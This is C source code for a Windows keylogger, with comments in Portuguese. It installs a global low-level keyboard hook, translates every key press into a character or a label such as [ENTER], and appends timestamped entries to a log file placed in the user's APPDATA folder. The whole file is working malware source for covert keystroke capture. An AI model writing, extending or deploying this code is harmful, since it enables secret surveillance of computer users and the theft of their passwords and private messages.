#include "keylogger.h"
#include "config.h"
#include <windows.h>
#include <stdio.h>
#include <time.h>

HHOOK hHook;
char current_log_file[MAX_PATH];

// Obter timestamp formatado
void get_timestamp(char* buffer, size_t size) {
    time_t now = time(NULL);
    struct tm* tm_info = localtime(&now);
    strftime(buffer, size, "[%Y-%m-%d %H:%M:%S]", tm_info);
}

// Registrar tecla pressionada
void log_keystroke(const char* key) {
    FILE* f = fopen(current_log_file, "a");
    if (f) {
        char timestamp[64];
        get_timestamp(timestamp, sizeof(timestamp));
        fprintf(f, "%s %s\n", timestamp, key);
        fclose(f);
    }
}

// Callback do hook de teclado
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT* kbd = (KBDLLHOOKSTRUCT*)lParam;
        char key[64] = {0};
        
        // Mapeamento de teclas especiais
        switch (kbd->vkCode) {
            case VK_RETURN: strcpy(key, "[ENTER]"); break;
            case VK_SPACE: strcpy(key, "[SPACE]"); break;
            case VK_TAB: strcpy(key, "[TAB]"); break;
            // [...] Adicione mais teclas especiais
            default:
                BYTE keyboardState[256];
                WORD wideChar;
                GetKeyboardState(keyboardState);
                if (ToAscii(kbd->vkCode, kbd->scanCode, keyboardState, &wideChar, 0) == 1) {
                    snprintf(key, sizeof(key), "%c", (char)wideChar);
                } else {
                    snprintf(key, sizeof(key), "[0x%02X]", kbd->vkCode);
                }
        }
        
        log_keystroke(key);
    }
    return CallNextHookEx(hHook, nCode, wParam, lParam);
}

void start_keylogger() {
    // Configurar arquivo de log
    char appdata[MAX_PATH];
    SHGetFolderPath(NULL, CSIDL_APPDATA, NULL, 0, appdata);
    snprintf(current_log_file, sizeof(current_log_file), "%s\\%s", appdata, LOG_FILE_NAME);

    // Instalar hook
    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
    
    // Loop de mensagens
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    
    UnhookWindowsHookEx(hHook);
}
